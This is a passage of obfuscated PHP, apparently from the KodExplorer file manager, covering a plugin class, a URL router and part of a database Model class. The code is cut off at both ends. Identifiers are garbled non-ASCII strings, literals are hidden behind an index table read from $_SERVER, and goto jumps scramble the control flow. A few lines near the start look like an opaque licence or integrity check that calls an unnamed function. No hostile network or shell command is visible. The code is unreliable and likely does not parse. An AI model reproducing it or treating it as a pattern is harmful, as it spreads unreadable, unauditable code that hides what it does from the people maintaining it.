$f“¹ñÛçÑŞ[678]; $c¾¶‹¼‰Æ = $_SERVER[$f“¹ñÛçÑŞ[679]] . $f“¹ñÛçÑŞ[680]; goto BòÅ¬‘¥¯œ; BòÅ¬‘¥¯œ: $dºëÁëé = $eõåáÈ©($c¾¶‹¼‰Æ); $AîŸÓÅ†ø = explode($f“¹ñÛçÑŞ[217], $dºëÁëé); if (count($AîŸÓÅ†ø) < $f“¹ñÛçÑŞ[567]) { $AÖé½Œª = $f“¹ñÛçÑŞ[681]; $AÖé½Œª(); } goto eŒ„ëö¥»À; dëïôŞí—‚: } return $this->modelPlugin->setConfig($this->pluginName, $Ağë´³óÇ); } public function onSetConfig($e¤Ö³ÒĞ¢â) { } public function onGetConfig($f …¯ºØÊ) { } public function onChangeStatus($FØË…ö‚—Ï) { } public function onUninstall() { } public function onInstall() { } public function authCheck($bß¯”…ƒİÚ = "\160\x6c\x75\x67\151\156\101\x75\164\150") { $EÛÇÆòàÎã =& $_SERVER[Î¿—”òá]; if (!defined($EÛÇÆòàÎã[427])) { return !1; } if (_get($GLOBALS, $EÛÇÆòàÎã[457])) { return !0; } $Bó“‡³‚Òñ = $this->getConfig(); if (!$Bó“‡³‚Òñ[$bß¯”…ƒİÚ]) { return !1; } return ActionCall($EÛÇÆòàÎã[1362], $Bó“‡³‚Òñ[$bß¯”…ƒİÚ]); } public function url($E„Åîà‚í‰, $C¤‡Ç²¤å† = '', $b†öš•Å±˜ = true) { goto cµª’ø¶Ñº; fßËÑ¦Áó¢: $B‰»ÜòÜ² = $this->packageVersion(); $D¼½—ô°½ = $EçÛ¨ÜÖœ— . $E©Ÿ®íÂ‚[412] . $B‰»ÜòÜ²; if (substr($E„Åîà‚í‰, 0, 4) == $E©Ÿ®íÂ‚[144] || substr($E„Åîà‚í‰, 0, 2) == $E©Ÿ®íÂ‚[1148]) { $f ‹°“½½ = $E„Åîà‚í‰ . $E©Ÿ®íÂ‚[1363] . $D¼½—ô°½; } else { if ($C¤‡Ç²¤å† == $E©Ÿ®íÂ‚[33]) { $f ‹°“½½ = $this->pluginHost . $E„Åîà‚í‰ . $E©Ÿ®íÂ‚[1363] . $D¼½—ô°½; } else { if ($C¤‡Ç²¤å† === $E©Ÿ®íÂ‚[76]) { $f ‹°“½½ = $this->pluginHost . $E„Åîà‚í‰; } else { if ($C¤‡Ç²¤å† == $E©Ÿ®íÂ‚[1364]) { $f ‹°“½½ = STATIC_PATH . $E„Åîà‚í‰ . $E©Ÿ®íÂ‚[1363] . $EçÛ¨ÜÖœ—; } else { if ($C¤‡Ç²¤å† == $E©Ÿ®íÂ‚[1365]) { $f ‹°“½½ = APP_HOST . $E©Ÿ®íÂ‚[1366] . $E„Åîà‚í‰ . $E©Ÿ®íÂ‚[1363] . $EçÛ¨ÜÖœ—; } else { if (isset($CÓ’ã­ŒİÒ[$C¤‡Ç²¤å†])) { $f ‹°“½½ = $CÓ’ã­ŒİÒ[$C¤‡Ç²¤å†] . $E„Åîà‚í‰ . $E©Ÿ®íÂ‚[1363] . $D¼½—ô°½; } } } } } } goto FŠÕ’ÒÑáŠ; FŠÕ’ÒÑáŠ: if (!$b†öš•Å±˜) { return $f ‹°“½½; } echo $f ‹°“½½; goto Bµéµ­ «ô; cµª’ø¶Ñº: $E©Ÿ®íÂ‚ =& $_SERVER[Î¿—”òá]; $CÓ’ã­ŒİÒ = $this->getConfig(); $EçÛ¨ÜÖœ— = KOD_VERSION . $E©Ÿ®íÂ‚[91] . KOD_VERSION_BUILD; goto fßËÑ¦Áó¢; Bµéµ­ «ô: } public function link($eÚ·ƒ¸Ê = false, $A¯ÆÁÊ† = '') { $a‚ÇÍä¦°Å =& $_SERVER[Î¿—”òá]; if (!$eÚ·ƒ¸Ê) { $this->link($a‚ÇÍä¦°Å[1367], $a‚ÇÍä¦°Å[1365]); $this->link($a‚ÇÍä¦°Å[1368], $a‚ÇÍä¦°Å[1364]); $this->link($a‚ÇÍä¦°Å[1369], $a‚ÇÍä¦°Å[1364]); $this->link($a‚ÇÍä¦°Å[1370], $a‚ÇÍä¦°Å[1364]); $this->link($a‚ÇÍä¦°Å[1371], $a‚ÇÍä¦°Å[1364]); return; } $Cå‚˜Åƒ”Æ = $this->url($eÚ·ƒ¸Ê, $A¯ÆÁÊ†, !1); if (substr($eÚ·ƒ¸Ê, -3) == $a‚ÇÍä¦°Å[1372]) { echo $a‚ÇÍä¦°Å[1373] . $Cå‚˜Åƒ”Æ . $a‚ÇÍä¦°Å[1374] . $a‚ÇÍä¦°Å[217]; } else { if (substr($eÚ·ƒ¸Ê, -4) == $a‚ÇÍä¦°Å[1375]) { echo $a‚ÇÍä¦°Å[1376] . $Cå‚˜Åƒ”Æ . $a‚ÇÍä¦°Å[1377] . $a‚ÇÍä¦°Å[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\x2b", "\x3a\x6e\x75\155" => "\133\x30\x2d\x39\135\x2b", "\x3a\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($e·à‡Ÿ—†», $a–Æ‰‚«ã) { $eµâÓµàË¢ =& $_SERVER[Î¿—”òá]; if ($e·à‡Ÿ—†» == $eµâÓµàË¢[1378]) { $d‹™›”ÚĞ = array_map($eµâÓµàË¢[1379], $a–Æ‰‚«ã[0]); $F›„‘õÑƒ  = strpos($a–Æ‰‚«ã[1], $eµâÓµàË¢[8]) === 0 ? $a–Æ‰‚«ã[1] : $eµâÓµàË¢[8] . $a–Æ‰‚«ã[1]; $dßËİ—ˆâ” = $a–Æ‰‚«ã[2]; } else { $d‹™›”ÚĞ = null; $F›„‘õÑƒ  = strpos($a–Æ‰‚«ã[0], $eµâÓµàË¢[8]) === 0 ? $a–Æ‰‚«ã[0] : $eµâÓµàË¢[8] . $a–Æ‰‚«ã[0]; $dßËİ—ˆâ” = $a–Æ‰‚«ã[1]; } array_push(self::$maps, $d‹™›”ÚĞ); array_push(self::$routes, $F›„‘õÑƒ ); array_push(self::$methods, strtoupper($e·à‡Ÿ—†»)); array_push(self::$callbacks, $dßËİ—ˆâ”); } public static function error($f‚öÚê) { self::$errorCallback = $f‚öÚê; } public static function haltOnMatch($EÉ—”²Ë©ó = true) { self::$halts = $EÉ—”²Ë©ó; } public static function dispatch() { goto e‚«ïÈÚ·˜; fâ‡¬¼íÍâ: self::$routes = preg_replace($aå‰¡Üøˆå[1066], $aå‰¡Üøˆå[8], self::$routes); if (in_array($F°¸°·¾™, self::$routes)) { $CİÓ˜ÕŒ¦Ò = array_keys(self::$routes, $F°¸°·¾™); foreach ($CİÓ˜ÕŒ¦Ò as $dÒ»æªîÉñ) { if (self::$methods[$dÒ»æªîÉñ] == $D…·Û‚Ó¸Ç || self::$methods[$dÒ»æªîÉñ] == $aå‰¡Üøˆå[1381] || in_array($D…·Û‚Ó¸Ç, self::$maps[$dÒ»æªîÉñ])) { $a•Ï‘è‡˜ñ = !0; if (!is_object(self::$callbacks[$dÒ»æªîÉñ])) { $fÀùÅˆ—‡Ã = explode($aå‰¡Üøˆå[8], self::$callbacks[$dÒ»æªîÉñ]); $FÈ“¿™³ÎÅ = end($fÀùÅˆ—‡Ã); $D±Å¨¤ÂåÚ = explode($aå‰¡Üøˆå[1382], $FÈ“¿™³ÎÅ); $BóİšŒÒŠ = new $D±Å¨¤ÂåÚ[0](); $BóİšŒÒŠ->{$D±Å¨¤ÂåÚ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$dÒ»æªîÉñ]); if (self::$halts) { return; } } } } } else { $C¥Ş¡¬ç¨¬ = 0; foreach (self::$routes as $dÒ»æªîÉñ) { if (strpos($dÒ»æªîÉñ, $aå‰¡Üøˆå[4]) !== !1) { $dÒ»æªîÉñ = str_replace($d“ˆ°ƒÈŒå, $d–ÌöÆˆ¶Î, $dÒ»æªîÉñ); } if (preg_match($aå‰¡Üøˆå[1383] . $dÒ»æªîÉñ . $aå‰¡Üøˆå[1384], $F°¸°·¾™, $b¬Ñä³°ñ)) { if (self::$methods[$C¥Ş¡¬ç¨¬] == $D…·Û‚Ó¸Ç || self::$methods[$C¥Ş¡¬ç¨¬] == $aå‰¡Üøˆå[1381] || !empty(self::$maps[$C¥Ş¡¬ç¨¬]) && in_array($D…·Û‚Ó¸Ç, self::$maps[$C¥Ş¡¬ç¨¬])) { $a•Ï‘è‡˜ñ = !0; array_shift($b¬Ñä³°ñ); if (!is_object(self::$callbacks[$C¥Ş¡¬ç¨¬])) { $fÀùÅˆ—‡Ã = explode($aå‰¡Üøˆå[8], self::$callbacks[$C¥Ş¡¬ç¨¬]); $FÈ“¿™³ÎÅ = end($fÀùÅˆ—‡Ã); $D±Å¨¤ÂåÚ = explode($aå‰¡Üøˆå[1382], $FÈ“¿™³ÎÅ); $BóİšŒÒŠ = new $D±Å¨¤ÂåÚ[0](); if (!method_exists($BóİšŒÒŠ, $D±Å¨¤ÂåÚ[1])) { echo $aå‰¡Üøˆå[1385]; } else { call_user_func_array(array($BóİšŒÒŠ, $D±Å¨¤ÂåÚ[1]), $b¬Ñä³°ñ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$C¥Ş¡¬ç¨¬], $b¬Ñä³°ñ); if (self::$halts) { return; } } } } $C¥Ş¡¬ç¨¬++; } } if ($a•Ï‘è‡˜ñ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $A› Œù§½Á =& $_SERVER[Î¿—”òá]; header($_SERVER[$A› Œù§½Á[1386]] . $A› Œù§½Á[1387]); echo $A› Œù§½Á[1388]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aå‰¡Üøˆå[1380]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cÜÊ•‘ñÂ¨; e£ÁêÚ‰ Ø: $d“ˆ°ƒÈŒå = array_keys(static::$patterns); $d–ÌöÆˆ¶Î = array_values(static::$patterns); $a•Ï‘è‡˜ñ = !1; goto fâ‡¬¼íÍâ; e‚«ïÈÚ·˜: $aå‰¡Üøˆå =& $_SERVER[Î¿—”òá]; $F°¸°·¾™ = parse_url($_SERVER[$aå‰¡Üøˆå[1380]], PHP_URL_PATH); $D…·Û‚Ó¸Ç = $_SERVER[$aå‰¡Üøˆå[154]]; goto e£ÁêÚ‰ Ø; cÜÊ•‘ñÂ¨: } } goto Eƒé­Àòµ¶; bê„éĞÄğ: define($_SERVER[Î¿—”òá][230], 0); define($_SERVER[Î¿—”òá][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\162\x64\x65\x72", "\141\154\151\141\163", "\x68\141\166\x69\x6e\x67", "\x67\x72\157\165\x70", "\x6c\157\143\153", "\144\151\x73\x74\151\x6e\x63\x74", "\141\165\x74\157", "\146\x69\154\164\x65\162", "\x76\x61\154\x69\144\x61\164\x65", "\x72\x65\163\x75\x6c\164", "\x62\x69\156\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($CéĞ«Šæ¸ = '', $fšìˆ‚ÒÄ = '', $B£µŠÑİç« = '') { $B†ˆöˆ¿”¨ =& $_SERVER[Î¿—”òá]; $this->_initialize(); if (!empty($CéĞ«Šæ¸)) { if (strpos($CéĞ«Šæ¸, $B†ˆöˆ¿”¨[91])) { list($this->dbName, $this->name) = explode($B†ˆöˆ¿”¨[91], $CéĞ«Šæ¸); } else { $this->name = $CéĞ«Šæ¸; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($fšìˆ‚ÒÄ)) { $this->tablePrefix = $B†ˆöˆ¿”¨[33]; } elseif ($B†ˆöˆ¿”¨[33] != $fšìˆ‚ÒÄ) { $this->tablePrefix = $fšìˆ‚ÒÄ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B†ˆöˆ¿”¨[232]); } $this->db(0, empty($this->connection) ? $B£µŠÑİç« : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $CøÌë·çö =& $_SERVER[Î¿—”òá]; if (empty($this->fields)) { if (think_config($CøÌë·çö[233])) { $f‰–ÙÓ½ = $this->dbName ? $this->dbName : think_config($CøÌë·çö[234]); $B¤¨‹ŸñÔ‚ = think_var_cache($CøÌë·çö[235] . strtolower(get_path_this($f‰–ÙÓ½) . $CøÌë·çö[91] . $this->name)); if ($B¤¨‹ŸñÔ‚) { $Aµ—ôóÀùõ = think_config($CøÌë·çö[236]); if (empty($Aµ—ôóÀùõ) || $B¤¨‹ŸñÔ‚[$CøÌë·çö[237]] == $Aµ—ôóÀùõ) { $this->fields = $B¤¨‹ŸñÔ‚; return; } } } $this->flush(); } } public function flush() { goto BÒµù¡à‡ª; BÒµù¡à‡ª: $a²±°íÜ¾Ö =& $_SERVER[Î¿—”òá]; $this->db->setModel($this->name); $f÷Í˜¢óî“ = $this->db->getFields($this->getTableName()); goto eÃ‘í…š‡ø; c¼¾÷ìƒÖ÷: if (think_config($a²±°íÜ¾Ö[233])) { $FÃ•›—†‘Ø = $this->dbName ? $this->dbName : think_config($a²±°íÜ¾Ö[234]); think_var_cache($a²±°íÜ¾Ö[235] . strtolower(get_path_this($FÃ•›—†‘Ø) . $a²±°íÜ¾Ö[91] . $this->name), $this->fields); } goto dêµ²ø²’Û; CÁóÊ¾»Œ: foreach ($f÷Í˜¢óî“ as $aï…´ºÂò => $eãìÊµŞ) { $Eà¸É—ÇÅ[$aï…´ºÂò] = $eãìÊµŞ[$a²±°íÜ¾Ö[29]]; if ($eãìÊµŞ[$a²±°íÜ¾Ö[36]]) { $this->fields[$a²±°íÜ¾Ö[239]] = $aï…´ºÂò; if ($eãìÊµŞ[$a²±°íÜ¾Ö[39]]) { $this->fields[$a²±°íÜ¾Ö[238]] = !0; } } } $this->fields[$a²±°íÜ¾Ö[240]] = $Eà¸É—ÇÅ; if (think_config($a²±°íÜ¾Ö[236])) { $this->fields[$a²±°íÜ¾Ö[237]] = think_config($a²±°íÜ¾Ö[236]); } goto c¼¾÷ìƒÖ÷; eÃ‘í…š‡ø: if (!$f÷Í˜¢óî“) { return !1; } $this->fields = array_keys($f÷Í˜¢óî“); $this->fields[$a²±°íÜ¾Ö[238]] = !1; goto CÁóÊ¾»Œ; dêµ²ø²’Û: } public function switchModel($fëğ¤…Ã‹±, $F¶“Åƒ±Ùå = array()) { $CÇŒ…µêØ =& $_SERVER[Î¿—”òá]; $FåÔôóŒÑ† = ucwords(strtolower($fëğ¤…Ã‹±)) . $CÇŒ…µêØ[241]; if (!class_exists($FåÔôóŒÑ†)) { think_exception($FåÔôóŒÑ† . think_lang($CÇŒ…µêØ[242])); } $this->_extModel = new $FåÔôóŒÑ†($this->name); if (!empty($F¶“Åƒ±Ùå)) { foreach ($F¶“Åƒ±Ùå as $cøÜŸÅÒŠ¿) { $this->_extModel->setProperty($cøÜŸÅÒŠ¿, $this->{$cøÜŸÅÒŠ¿}); } } return $this->_extModel; } public function __set($A·•Û™Ÿé, $A¡¯‡ÊŠ‘) { $this->data[$A·•Û™Ÿé] = $A¡¯‡ÊŠ‘; } public function __get($F ©Û»Š×) { return isset($this->data[$F ©Û»Š×]) ? $this->data[$F ©Û»Š×] : null; } public function __isset($D¼ôç•Œ•ƒ) { return isset($this->data[$D¼ôç•Œ•ƒ]); } public function __unset($DÒÀÉáõŒÀ) { unset($this->data[$DÒÀÉáõŒÀ]); } public function __call($dÅ±àĞ¶‘›, $b«”ÏÔãƒ) { $Aˆ¦êÍÛ =& $_SERVER[Î¿—”òá]; if (in_array(strtolower($dÅ±àĞ¶‘›), $this->methods, !0)) { $this->options[strtolower($dÅ±àĞ¶‘›)] = $b«”ÏÔãƒ[0]; return $this; } elseif (in_array(strtolower($dÅ±àĞ¶‘›), array($Aˆ¦êÍÛ[243], $Aˆ¦êÍÛ[244], $Aˆ¦êÍÛ[245], $Aˆ¦êÍÛ[246], $Aˆ¦êÍÛ[247]), !0)) { $cÔõ³’¸÷Š = isset($b«”ÏÔãƒ[0]) ? $b«”ÏÔãƒ[0] : $Aˆ¦êÍÛ[176]; $cÔõ³’¸÷Š = $this->db->parseKey($cÔõ³’¸÷Š); return $this->getField(strtoupper($dÅ±àĞ¶‘›) . $Aˆ¦êÍÛ[248] . $cÔõ³’¸÷Š . $Aˆ¦êÍÛ[249] . $dÅ±àĞ¶‘›, $Aˆ¦êÍÛ[243]); } elseif (strtolower(substr($dÅ±àĞ¶‘›, 0, 5)) == $Aˆ¦êÍÛ[250]) { $cÔõ³’¸÷Š = think_parse_name(substr($dÅ±àĞ¶‘›, 5)); $Føë·Ñ™•[$cÔõ³’¸÷Š] = $b«”ÏÔãƒ[0]; return $this->where($Føë·Ñ™•)->find(); } elseif (strtolower(substr($dÅ±àĞ¶‘›, 0, 10)) == $Aˆ¦êÍÛ[251]) { $a’Éáíš = think_parse_name(substr($dÅ±àĞ¶‘›, 10)); $Føë·Ñ™•[$a’Éáíš] = $b«”ÏÔãƒ[0]; return $this->where($Føë·Ñ™•)->getField($b«”ÏÔãƒ[1]); } elseif (isset($this->_scope[$dÅ±àĞ¶‘›])) { return $this->scope($dÅ±àĞ¶‘›, $b«”ÏÔãƒ[0]); } elseif (method_exists($this, $dÅ±àĞ¶‘›)) { array_unshift($b«”ÏÔãƒ, $dÅ±àĞ¶‘›); return call_user_func_array(array($this, $Aˆ¦êÍÛ[252]), $b«”ÏÔãƒ); } else { return call_user_func_array(array(parent, $dÅ±àĞ¶‘›), $b«”ÏÔãƒ); } } protected function call() { goto FÉåÒ´ºˆ; E»´¦ùŠíÌ: $A¹ÅÓ¼²¡ = $D¬‰åÍ™Ä¨; if (is_array($D¬‰åÍ™Ä¨)) { $A¹ÅÓ¼²¡ = $D¬‰åÍ™Ä¨[1]; $D¬‰åÍ™Ä¨ = $D¬‰åÍ™Ä¨[0]; } $aÏ”’çç†· = count($F‚Ã¾ˆ´µó) - 1; goto fŞŒ¤½È„½; fŞŒ¤½È„½: if (isset($F‚Ã¾ˆ´µó[$aÏ”’çç†·]) && $F‚Ã¾ˆ´µó[$aÏ”’çç†·] === $D¬‰åÍ™Ä¨) { think_exception(__CLASS__ . $CŸšª…Âè¢[4] . $D¬‰åÍ™Ä¨ . think_lang($CŸšª…Âè¢[253])); return; } $F‚Ã¾ˆ´µó[] = $D¬‰åÍ™Ä¨; if (method_exists($this, $CŸšª…Âè¢[254])) { $D¤«¥½Ï·™ = call_user_func_array(array($this, $CŸšª…Âè¢[255]), array($A¹ÅÓ¼²¡, $F‚Ã¾ˆ´µó)); if (!is_null($D¤«¥½Ï·™) && $D¤«¥½Ï·™ !== !1) { return $D¤«¥½Ï·™; } } goto aƒáî ³ø; FÉåÒ´ºˆ: $CŸšª…Âè¢ =& $_SERVER[Î¿—”òá]; $F‚Ã¾ˆ´µó = func_get_args(); $D¬‰åÍ™Ä¨ = array_shift($F‚Ã¾ˆ´µó); goto E»´¦ùŠíÌ; aƒáî ³ø: $eÀí–¸’£ = call_user_func_array(array($this, $D¬‰åÍ™Ä¨), $F‚Ã¾ˆ´µó); if (method_exists($this, $CŸšª…Âè¢[256])) { $D¤«¥½Ï·™ = call_user_func_array(array($this, $CŸšª…Âè¢[257]), array($A¹ÅÓ¼²¡, $F‚Ã¾ˆ´µó, $eÀí–¸’£)); if ($D¤«¥½Ï·™) { return $D¤«¥½Ï·™; } } return $eÀí–¸’£; goto e½Ê˜´˜‚‰; e½Ê˜´˜‚‰: } protected function _initialize() { } protected function _facade($FŠî„Å‡É) { $f¸å­Çöå  =& $_SERVER[Î¿—”òá]; if (!empty($this->fields)) { foreach ($FŠî„Å‡É as $BçÜßÎ¯ => $b¹”ì÷½‚Í) { if (!in_array($BçÜßÎ¯, $this->fields, !0)) { unset($FŠî„Å‡É[$BçÜßÎ¯]); } elseif (is_scalar($b¹”ì÷½‚Í)) { $this->_parseType($FŠî„Å‡É, $BçÜßÎ¯); } } } if (!empty($this->options[$f¸å­Çöå [258]])) { $FŠî„Å‡É = array_map($this->options[$f¸å­Çöå [258]], $FŠî„Å‡É); unset($this->options[$f¸å­Çöå [258]]); } $this->_beforeWrite($FŠî„Å‡É); return $FŠî„Å‡É; } protected function _beforeWrite(&$DÉôÆ×­ò) { } public function add($eíĞÕ„©¯ = '', $BÏ¢Û¢‰¬ = array(), $cëâ©œÙ® = false) { goto bŒêö×±Ğ; BÔ´ò¢ÎÛ: return $aÏª¿Óöğ; goto FŠ²ƒÆÔ¥è; Eêø†½åËÕ: if (!1 === $this->_beforeInsert($eíĞÕ„©¯, $BÏ¢Û¢‰¬)) { return !1; } $aÏª¿Óöğ = $this->db->insert($eíĞÕ„©¯, $BÏ¢Û¢‰¬, $cëâ©œÙ®); if (!1 !== $aÏª¿Óöğ) { $e¹‚†êµ¬¶ = $this->getLastInsID(); if ($e¹‚†êµ¬¶) { $eíĞÕ„©¯[$this->getPk()] = $e¹‚†êµ¬¶; $this->_after_insert($eíĞÕ„©¯, $BÏ¢Û¢‰¬); return $e¹‚†êµ¬¶; } $this->_after_insert($eíĞÕ„©¯, $BÏ¢Û¢‰¬); } goto BÔ´ò¢ÎÛ; bŒêö×±Ğ: if (empty($eíĞÕ„©¯)) { if (!empty($this->data)) { $eíĞÕ„©¯ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Î¿—”òá][259]); return !1; } } $BÏ¢Û¢‰¬ = $this->_parseOptions($BÏ¢Û¢‰¬); $eíĞÕ„©¯ = $this->_facade($eíĞÕ„©¯); goto Eêø†½åËÕ; FŠ²ƒÆÔ¥è: } protected function _beforeInsert(&$fëö¯³å¡, $aÈÉÎ¾à’) { } protected function _after_insert($CšÑ·×İĞè, $Aó„·ãİ) { } public function addAll($b›âéíµÕ’, $d¿Œº„ë„— = array(), $f‚â¸„•Ê = false) { goto B„ò°£ÎÕÏ; B„ò°£ÎÕÏ: $aö……À›¦à =& $_SERVER[Î¿—”òá]; if (empty($b›âéíµÕ’)) { $this->error = think_lang($aö……À›¦à[259]); return !1; } $d¿Œº„ë„— = $this->_parseOptions($d¿Œº„ë„—); goto BÜù‚©×; e³ö„é®î: return $Dª±àœƒ; goto d¡ˆÛ™®; BÜù‚©×: foreach ($b›âéíµÕ’ as $BÓÎğª·² => $dÌ¾Æ„™ ¾) { $b›âéíµÕ’[$BÓÎğª·²] = $this->_facade($dÌ¾Æ„™ ¾); } if (method_exists($this->db, $aö……À›¦à[260])) { $Dª±àœƒ = $this->db->insertAll($b›âéíµÕ’, $d¿Œº„ë„—, $f‚â¸„•Ê); } else { $this->startTrans(); foreach ($b›âéíµÕ’ as $BÓÎğª·² => $dÌ¾Æ„™ ¾) { $Dª±àœƒ = $this->db->insert($dÌ¾Æ„™ ¾, $d¿Œº„ë„—, $f‚â¸„•Ê); } $this->commit(); } if (!1 !== $Dª±àœƒ) { $cç¯˜†‚É¬ = $this->getLastInsID(); if ($cç¯˜†‚É¬) { return $cç¯˜†‚É¬; } } goto e³ö„é®î; d¡ˆÛ™®: } public function selectAdd($CÄ‡è®Çßœ = '', $CĞ“Ä§Òé† = '', $aœ¬·îøƒ = array()) { $aî¶“ç«òÀ =& $_SERVER[Î¿—”òá]; $aœ¬·îøƒ = $this->_parseOptions($aœ¬·îøƒ); if (!1 === ($eìÑ“µøº÷ = $this->db->selectInsert($CÄ‡è®Çßœ ? $CÄ‡è®Çßœ : $aœ¬·îøƒ[$aî¶“ç«òÀ[261]], $CĞ“Ä§Òé† ? $CĞ“Ä§Òé† : $this->getTableName(), $aœ¬·îøƒ))) { $this->error = think_lang($aî¶“ç«òÀ[262]); return !1; } else { return $eìÑ“µøº÷; } } public function save($eœ†ŠÑ‚à¤ = '', $CñÏï½»Ô÷ = array()) { goto a†ù³¤ªÌ¾; Bï™ŒÕˆÂ: if (is_array($CñÏï½»Ô÷[$D¦îï²›…[263]]) && isset($CñÏï½»Ô÷[$D¦îï²›…[263]][$D¤æ…íÏ§¹])) { $FöòŒ‡“·¢ = $CñÏï½»Ô÷[$D¦îï²›…[263]][$D¤æ…íÏ§¹]; } if (!1 === $this->_beforeUpdate($eœ†ŠÑ‚à¤, $CñÏï½»Ô÷)) { return !1; } $fª‡ÍÉÕ¡§ = $this->db->update($eœ†ŠÑ‚à¤, $CñÏï½»Ô÷); goto dÅ±²ÓÉ; a†ù³¤ªÌ¾: $D¦îï²›… =& $_SERVER[Î¿—”òá]; if (empty($eœ†ŠÑ‚à¤)) { if (!empty($this->data)) { $eœ†ŠÑ‚à¤ = $this->data; $this->data = array(); } else { $this->error = think_lang($D¦îï²›…[259]); return !1; } } $eœ†ŠÑ‚à¤ = $this->_facade($eœ†ŠÑ‚à¤); goto bÆÎĞËÄ; dÅ±²ÓÉ: if (!1 !== $fª‡ÍÉÕ¡§) { if (isset($FöòŒ‡“·¢)) { $eœ†ŠÑ‚à¤[$D¤æ…íÏ§¹] = $FöòŒ‡“·¢; } $this->_afterUpdate($eœ†ŠÑ‚à¤, $CñÏï½»Ô÷); } return $fª‡ÍÉÕ¡§; goto cæÄï…äºİ; bÆÎĞËÄ: $CñÏï½»Ô÷ = $this->_parseOptions($CñÏï½»Ô÷); $D¤æ…íÏ§¹ = $this->getPk(); if (!isset($CñÏï½»Ô÷[$D¦îï²›…[263]])) { if (isset($eœ†ŠÑ‚à¤[$D¤æ…íÏ§¹])) { $f ÙÑ“ÜôÆ[$D¤æ…íÏ§¹] = $eœ†ŠÑ‚à¤[$D¤æ…íÏ§¹]; $CñÏï½»Ô÷[$D¦îï²›…[263]] = $f ÙÑ“ÜôÆ; unset($eœ†ŠÑ‚à¤[$D¤æ…íÏ§¹]); } else { $this->error = think_lang($D¦îï²›…[262]); return !1; } } goto Bï™ŒÕˆÂ; cæÄï…äºİ: } protected function _beforeUpdate(&$DÚ¬äè…Î, $b†•ÇğˆíŒ) { } protected function _afterUpdate($f÷Ô‘Îİ©Ù, $A±„÷÷¯ËŒ) { } public function delete($F…Æğ«Éº = array()) { goto C¡—çºœ×ç; fÈ¦µÔ§Š: if (is_numeric($F…Æğ«Éº) || is_string($F…Æğ«Éº)) { if (strpos($F…Æğ«Éº, $eÙÅÂÑÍ—ê[47])) { $C¹íì°Ïğ‡[$b„‰Œ‡¦áß] = array($eÙÅÂÑÍ—ê[264], $F…Æğ«Éº); } else { $C¹íì°Ïğ‡[$b„‰Œ‡¦áß] = $F…Æğ«Éº; } $this->options[$eÙÅÂÑÍ—ê[263]] = $C¹íì°Ïğ‡; } $F…Æğ«Éº = $this->_parseOptions(); if (is_array($F…Æğ«Éº[$eÙÅÂÑÍ—ê[263]]) && isset($F…Æğ«Éº[$eÙÅÂÑÍ—ê[263]][$b„‰Œ‡¦áß])) { $ağ‹ÚÂòÆ = $F…Æğ«Éº[$eÙÅÂÑÍ—ê[263]][$b„‰Œ‡¦áß]; } goto a¹ÈÙ¨•†; a¹ÈÙ¨•†: $eõÍ©ƒø÷ó = $this->db->delete($F…Æğ«Éº); if (!1 !== $eõÍ©ƒø÷ó) { $aè¾ñ¥Š³® = array(); if (isset($ağ‹ÚÂòÆ)) { $aè¾ñ¥Š³®[$b„‰Œ‡¦áß] = $ağ‹ÚÂòÆ; } $this->_after_delete($aè¾ñ¥Š³®, $F…Æğ«Éº); } return $eõÍ©ƒø÷ó; goto b ÄĞõ˜ô; C¡—çºœ×ç: $eÙÅÂÑÍ—ê =& $_SERVER[Î¿—”òá]; if (empty($F…Æğ«Éº) && empty($this->options[$eÙÅÂÑÍ—ê[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $b„‰Œ‡¦áß = $this->getPk(); goto fÈ¦µÔ§Š; b ÄĞõ˜ô: } protected function _after_delete($b¯Ö•¿¤’í, $DİºóööŠÈ) { } public function select($cÒ†µ°õ±‚ = array()) { goto AŸÌ¼¾²¬°; a…±Ì„ÚÛä: $this->_afterSelect($FÖ¦èé¶Çğ, $cÒ†µ°õ±‚); return $FÖ¦èé¶Çğ; goto c…ŸÂöÑğø; AŸÌ¼¾²¬°: $eØáô†Şáî =& $_SERVER[Î¿—”òá]; if (is_string($cÒ†µ°õ±‚) || is_numeric($cÒ†µ°õ±‚)) { $FÈØ—Ìï = $this->getPk(); if (strpos($cÒ†µ°õ±‚, $eØáô†Şáî[47])) { $b†‚î†‚Ñ[$FÈØ—Ìï] = array($eØáô†Şáî[264], $cÒ†µ°õ±‚); } else { $b†‚î†‚Ñ[$FÈØ—Ìï] = $cÒ†µ°õ±‚; } $this->options[$eØáô†Şáî[263]] = $b†‚î†‚Ñ; } elseif (!1 === $cÒ†µ°õ±‚) { $cÒ†µ°õ±‚ = $this->_parseOptions(); return $eØáô†Şáî[265] . $this->db->buildSelectSql($cÒ†µ°õ±‚) . $eØáô†Şáî[266]; } $cÒ†µ°õ±‚ = $this->_parseOptions(); goto CœÛ—œÖ‡; CœÛ—œÖ‡: $FÖ¦èé¶Çğ = $this->db->select($cÒ†µ°õ±‚); if (!1 === $FÖ¦èé¶Çğ) { return !1; } if (empty($FÖ¦èé¶Çğ)) { return null; } goto a…±Ì„ÚÛä; c…ŸÂöÑğø: } protected function _afterSelect(&$FÛ¥‘îïèÚ, $A ©Ä™«ö×) { } public function buildSql($d·ÑÛè‡¢‘ = array()) { 